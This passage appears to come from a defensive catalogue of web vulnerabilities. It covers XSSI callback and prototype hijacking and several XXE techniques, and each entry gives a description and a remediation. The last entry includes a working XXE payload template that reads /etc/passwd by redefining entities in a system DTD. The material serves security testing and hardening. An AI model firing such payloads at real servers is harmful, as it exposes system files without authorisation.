remediation: Sanitize dynamic JavaScript responses; avoid including sensitive data in client-side scripts.

title: JSONP callback hijacking via XSSI
description: JSONP responses can be exploited by hijacking callback functions to leak sensitive data. Attackers manipulate global objects or set up functions to capture JSONP responses.
remediation: Avoid JSONP; use modern alternatives like CORS with proper headers.

title: Prototype tampering to leak non-global variables via XSSI
description: By overriding JavaScript prototype methods (e.g., Array.prototype.slice), attackers can intercept and leak non-global variables during script execution.
remediation: Avoid modifying built-in prototypes; use safe coding practices.

title: Non-Script file XSSI via script tag inclusion
description: Non-script files (e.g., CSV, JSON) can be leaked cross-origin by including them as sources in a script tag. UTF-7 encoded JSON can bypass format restrictions in some browsers.
remediation: Avoid including non-script files via script tags; use proper content-type headers.

title: Basic XXE via custom entity declaration
description: XML parsers may allow custom entity declarations that can be referenced in document content, enabling file or resource access if external entities are enabled.
remediation: Disable DTD processing and external entities in XML parsers; use secure XML libraries with safe defaults.

title: XXE file read via SYSTEM entity
description: External SYSTEM entities can be used to read arbitrary files from the server filesystem when XML parsing supports file:// URIs.
remediation: Disable external entities and DTD processing; use allowlists for XML parsing.

title: XXE directory listing via ANY element
description: Declaring XML elements as ANY allows external entities to be used for directory listing by referencing directories instead of files.
remediation: Disable DTDs and external entities; restrict element content models.

title: XXE-induced SSRF via external entity
description: External entities can be used to force the server to make HTTP requests to internal or external systems, enabling SSRF attacks.
remediation: Disable external entities and DTDs; validate and restrict XML input.

title: Blind SSRF via XML parameter entities
description: When custom entities are blocked, XML parameter entities can still be used to trigger out-of-band HTTP requests for SSRF detection.
remediation: Disable DTD processing and parameter entities; use secure XML parsers.

title: Out-of-band data exfiltration via malicious DTD
description: Malicious external DTDs can be used to read files and exfiltrate their contents via HTTP requests to attacker-controlled servers.
remediation: Disable external DTDs and parameter entities; use allowlists and secure defaults.

title: Error-based XXE via external DTD
description: Malicious external DTDs can be used to trigger XML parsing errors that leak file contents in error messages when error reporting is enabled.
remediation: Disable external DTDs and error reporting; use secure XML parsing libraries.

title: Error-based XXE via system DTD redefinition
description: When out-of-band channels are blocked, attackers can redefine entities from system DTDs to trigger error-based XXE and leak file contents.
payload_templates: <!ENTITY % ISOamso '<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file'>"><!ENTITY % eval; %error;'>
remediation: Disable DTD processing and external entities; use secure XML libraries.
